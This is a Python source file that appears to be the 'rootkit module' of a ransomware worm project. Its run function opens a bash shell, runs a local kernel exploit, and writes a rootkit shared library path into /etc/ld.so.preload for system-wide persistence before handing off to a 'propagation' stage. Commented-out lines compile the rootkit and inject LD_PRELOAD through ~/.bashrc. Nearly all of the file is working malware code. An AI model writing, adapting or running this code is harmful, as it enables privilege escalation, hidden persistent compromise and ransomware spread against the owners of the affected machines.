###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

from pathlib import Path
import subprocess
import time

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################


def exec_bash(cmd, output=True):
    return subprocess.check_output(cmd, shell=True)


# run commands inside an opened shell
def run_command(process, command):
    process.stdin.write(command.encode())
    process.stdin.flush()  # Ensure the command is sent


###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################


def run():
    next_action = ""
    data = "no_data"
    print("[+] Rootkit module activated...")

    # create shell
    process = subprocess.Popen(
        ["bash"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )

    # kernel exploit
    run_command(process, "./exploit \n")
    run_command(process, "touch /etc/ld.so.preload \n")
    # run_command(
    #     process,
    #     "gcc -fPIC -shared -o ./utils/rootkit.so ./utils/rootkit.c -ldl \n",
    # )
    run_command(
        process,
        "echo '/home/user/ransom-worm/utils/rootkit.so' >/etc/ld.so.preload \n",
    )

    # close process
    process.stdin.close()
    process.terminate()
    process.wait(timeout=1)

    # ===

    # exec_bash("gcc -fPIC -shared -o ./utils/rootkit.so ./utils/rootkit.c -ldl")
    # exec_bash("export LD_PRELOAD=./utils/rootkit.so")

    # path of the current file
    # file_path = Path(__file__).resolve()
    # # Directory of the current file
    # dir_path = file_path.parent
    # print(dir_path)
    # cmd = f"export LD_PRELOAD={dir_path}/../utils/rootkit.so ps &&  ~/.bashrc"
    # subprocess.run(f"echo 'export LD_PRELOAD={dir_path}/../utils/rootkit.so'>> ~/.bashrc && source ~/.bashrc")
    # subprocess.run("export LD_PRELOAD=./utils/rootkit.so ps", shell=True)
    # subprocess.run(
    #     "gcc -fPIC -shared -o /tmp/rootkit.so ./utils/rootkit.c -ldl", shell=True
    # )
    # subprocess.run("chmod 755 /tmp/rootkit.so", shell=True)
    # # This lune unmesses the computer: echo 'export LD_PRELOAD=>> ~/.bashrc && . ~/.bashrc'
    # subprocess.run(
    #     "echo 'export LD_PRELOAD=/tmp/rootkit.so' >> ~/.bashrc && . ~/.bashrc",
    #     shell=True,
    # )

    # time.sleep(1)
    # subprocess.run("ps -a", shell=True)

    next_action = "propagation"
    return data, next_action


if __name__ == "__main__":
    run()
